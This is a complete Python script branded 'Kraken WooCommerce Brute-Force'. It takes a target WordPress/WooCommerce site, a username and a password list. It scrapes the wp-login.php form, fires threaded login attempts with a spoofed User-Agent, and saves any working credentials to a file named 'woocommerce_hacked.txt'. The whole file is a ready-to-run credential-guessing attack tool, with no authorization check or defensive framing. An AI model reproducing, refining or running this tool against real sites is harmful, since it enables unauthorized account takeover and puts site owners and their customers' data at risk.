import os
import sys
import time
import threading
import requests
import re
import logging
from random import choice
from colorama import Fore, init
import pyfiglet


init(autoreset=True)


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.makedirs('Results', exist_ok=True)
    os.makedirs('Logs', exist_ok=True)
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken WooCommerce Brute-Force")
    print(banner_color + banner)

def get_user_input():
    """Gathers user input for the WooCommerce brute force operation."""
    site = input(Fore.CYAN + 'Enter the target WooCommerce site (e.g., example.com): ').strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site

    username = input(Fore.CYAN + 'Enter Username: ').strip()
    if not username:
        logging.error(Fore.RED + 'Username cannot be empty!')
        sys.exit(1)

    password_file = input(Fore.CYAN + 'Enter Password List File: ').strip()
    return site, username, password_file

def load_passwords(password_file):
    """Loads passwords from the specified file."""
    if os.path.isfile(password_file):
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
        logging.info(f"{len(passwords)} passwords loaded.")
        return passwords
    else:
        logging.error(Fore.RED + f"Password list file not found: {password_file}")
        sys.exit(1)

def attempt_login(site, username, password):
    """Attempts to log in to the WooCommerce site using provided credentials."""
    try:
        sess = requests.Session()
        login_url = f'{site}/wp-login.php'
        response = sess.get(login_url, timeout=5)
        wp_submit_value = re.search(r'class="button button-primary button-large" value="(.*)"', response.text).group(1)
        wp_redirect_to = re.search(r'name="redirect_to" value="(.*)"', response.text).group(1)

        post_data = {
            'log': username,
            'pwd': password,
            'wp-submit': wp_submit_value,
            'redirect_to': wp_redirect_to,
            'testcookie': 1
        }
        logging.info(f'Trying password: {password}')
        response = sess.post(login_url, data=post_data, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)

        if 'wp-admin' in response.url:
            success_msg = Fore.GREEN + f'[+] Success! {site} | Username: {username} | Password: {password}'
            logging.info(success_msg.strip())
            with open('Results/woocommerce_hacked.txt', 'a') as writer:
                writer.write(f'{login_url}\nUsername: {username}\nPassword: {password}\n{"-"*40}\n')
            return success_msg
        return None
    except Exception as e:
        logging.error(f"Login attempt error: {str(e)}")
        return None

def run_bruteforce(site, username, passwords):
    """Runs brute-force attack with threading."""
    threads = []
    for password in passwords:
        t = threading.Thread(target=attempt_login, args=(site, username, password))
        t.start()
        threads.append(t)
        time.sleep(0.08)

    for thread in threads:
        thread.join()

def main():
    clear_console()
    display_banner()

    site, username, password_file = get_user_input()
    passwords = load_passwords(password_file)
    run_bruteforce(site, username, passwords)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "Script interrupted by user.")
